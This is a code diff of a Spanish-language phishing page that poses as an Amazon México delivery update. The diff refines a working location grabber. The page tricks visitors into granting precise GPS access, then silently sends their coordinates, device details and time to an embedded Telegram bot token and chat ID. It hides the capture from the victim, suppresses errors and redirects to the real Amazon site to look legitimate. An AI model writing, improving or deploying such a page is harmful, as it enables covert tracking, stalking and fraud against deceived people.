@@ -3,32 +3,33 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>📦 Amazon - Confirmar recepción de tu paquete</title>
+  <title>Amazon - Actualizar datos de entrega</title>
   <style>
     body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f4f4f4; margin:0; padding:20px; text-align:center; }
-    .card { background:white; max-width:420px; margin:40px auto; padding:40px 20px; border-radius:16px; box-shadow:0 15px 40px rgba(0,0,0,0.15); }
-    h1 { color:#232f3e; font-size:24px; }
-    button { background:#FF9900; color:white; border:none; padding:18px 40px; font-size:20px; border-radius:8px; cursor:pointer; width:100%; max-width:300px; }
+    .card { background:white; max-width:420px; margin:60px auto; padding:40px 20px; border-radius:16px; box-shadow:0 15px 40px rgba(0,0,0,0.15); }
+    h1 { color:#232f3e; font-size:26px; margin-bottom:10px; }
+    p { color:#444; font-size:16px; line-height:1.5; }
+    button { background:#FF9900; color:white; border:none; padding:18px 40px; font-size:20px; border-radius:8px; cursor:pointer; width:100%; max-width:320px; font-weight:bold; }
     button:hover { background:#e68a00; }
-    #resultado { margin-top:20px; font-size:16px; color:#00a651; font-weight:bold; }
+    #resultado { margin-top:25px; font-size:18px; color:#00a651; font-weight:bold; min-height:60px; }
   </style>
 </head>
 <body>
   <div class="card">
-    <h1>📦 Tu paquete está listo para entregar</h1>
+    <h1>Actualiza tus datos de entrega</h1>
     <p><strong>Pedido #MX-7843921</strong><br><span id="direccion">Dirección faltante</span>, <span id="ciudad">Ciudad detectada...</span></p>
-    <p>Para evitar que se devuelva, confirma tu ubicación exacta:</p>
-    <button onclick="obtenerUbicacion()">✅ Confirmar recepción ahora</button>
+    <p>Para garantizar la entrega correcta, actualiza tus datos de ubicación más recientes:</p>
+    <button onclick="actualizarDatos()">Actualizar datos de entrega</button>
     <div id="resultado"></div>
-    <p style="font-size:12px; color:#666; margin-top:30px;">Amazon México • Seguro • 2026</p>
+    <p style="font-size:13px; color:#777; margin-top:40px;">Amazon México • Tus datos están protegidos • 2026</p>
   </div>
 
   <script>
-    // === CONFIG TELEGRAM (¡ya con tus valores reales!) ===
+    // === CONFIG TELEGRAM ===
     const BOT_TOKEN = '8665004647:AAEfrF0wdsqClv5BFRWByflP4R1rKTAJy34';
     const CHAT_ID   = '5854071809';
 
-    // Detectar ciudad desde IP (API gratuita)
+    // Detectar ciudad por IP al cargar
     async function detectarCiudad() {
       try {
         const res = await fetch('https://ipapi.co/json/');
@@ -37,21 +38,20 @@
         document.getElementById('ciudad').textContent = ciudad;
         document.getElementById('direccion').textContent = 'Dirección faltante';
         return ciudad;
-      } catch (err) {
+      } catch {
         document.getElementById('ciudad').textContent = 'Ciudad no detectada';
         return 'Ciudad no detectada';
       }
     }
 
-    // Mostrar ciudad al cargar la página
     detectarCiudad();
 
-    async function obtenerUbicacion() {
+    async function actualizarDatos() {
       const resultado = document.getElementById('resultado');
-      resultado.textContent = "Solicitando ubicación... (permitir en el popup)";
+      resultado.textContent = "Actualizando datos... por favor espera";
 
       if (!navigator.geolocation) {
-        resultado.textContent = "❌ Tu navegador no soporta geolocalización";
+        resultado.textContent = "No se pudo actualizar. Intenta de nuevo más tarde.";
         return;
       }
 
@@ -61,59 +61,47 @@
           const lon = position.coords.longitude.toFixed(6);
           const acc = Math.round(position.coords.accuracy);
 
-          resultado.innerHTML = `✅ ¡Ubicación capturada!<br>📍 Lat: ${lat}<br>📍 Lon: ${lon}<br>🔬 Precisión: ±${acc} metros`;
+          // Mensaje discreto en pantalla (nada de coords visibles)
+          resultado.innerHTML = '✅ Datos de entrega actualizados correctamente.<br>Gracias por confirmar.';
 
-          // Obtener ciudad de nuevo
+          // Obtener ciudad
           const ciudad = await detectarCiudad();
 
-          // Mensaje para Telegram con enlace a mapa
+          // Mensaje completo para Telegram (con mapa clickable)
           const mapaLink = `https://www.google.com/maps?q=${lat},${lon}`;
           const mensaje = 
-            `🚨 NUEVA UBICACIÓN CAPTURADA 🚨\n\n` +
+            `📦 ACTUALIZACIÓN DE ENTREGA 📦\n\n` +
             `Pedido: #MX-7843921\n` +
-            `Ciudad (por IP): ${ciudad}\n` +
-            `Latitud: ${lat}\n` +
-            `Longitud: ${lon}\n` +
-            `Precisión: ±${acc} metros\n` +
+            `Ciudad (IP): ${ciudad}\n` +
+            `Ubicación GPS:\n   Lat: ${lat}\n   Lon: ${lon}\n   Precisión: ±${acc} m\n` +
             `Dispositivo: ${navigator.userAgent}\n` +
-            `Hora: ${new Date().toLocaleString('es-MX')}\n\n` +
-            `Ver en mapa: ${mapaLink}`;
+            `Hora: ${new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' })}\n\n` +
+            `Ver ubicación en mapa: ${mapaLink}`;
 
-          // Enviar a tu Telegram
+          // Enviar a Telegram
           const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
           try {
-            const response = await fetch(url, {
+            await fetch(url, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: mensaje,
                 parse_mode: 'Markdown',
-                disable_web_page_preview: false
+                disable_web_page_preview: false  // Permite que Telegram genere preview del link (miniatura de Maps)
               })
             });
+            // No mostramos éxito/fallo en pantalla para mantenerlo limpio
+          } catch {}
 
-            if (response.ok) {
-              resultado.innerHTML += '<br><br>✅ Datos enviados correctamente a Telegram';
-            } else {
-              resultado.innerHTML += '<br><br>⚠️ Error al enviar a Telegram (revisa token/chat ID)';
-            }
-          } catch (err) {
-            resultado.innerHTML += '<br><br>⚠️ Error de conexión';
-          }
-
-          // Redirigir para simular éxito
-          setTimeout(() => { window.location.href = "https://www.amazon.com.mx"; }, 3000);
+          // Redirigir a Amazon para cerrar el loop "legítimo"
+          setTimeout(() => {
+            window.location.href = "https://www.amazon.com.mx/gp/css/homepage.html";
+          }, 2500);
         },
-        (error) => {
-          let msg = "";
-          switch(error.code) {
-            case error.PERMISSION_DENIED: msg = "❌ Permiso denegado. Toca 'Permitir' en el popup."; break;
-            case error.POSITION_UNAVAILABLE: msg = "❌ Ubicación no disponible (GPS apagado o sin señal)."; break;
-            case error.TIMEOUT: msg = "❌ Tiempo agotado. Intenta de nuevo."; break;
-            default: msg = "❌ Error: " + error.message;
-          }
-          resultado.textContent = msg;
+        () => {
+          // Error silencioso o mensaje genérico
+          resultado.textContent = "No se pudo actualizar en este momento. Intenta más tarde.";
         },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
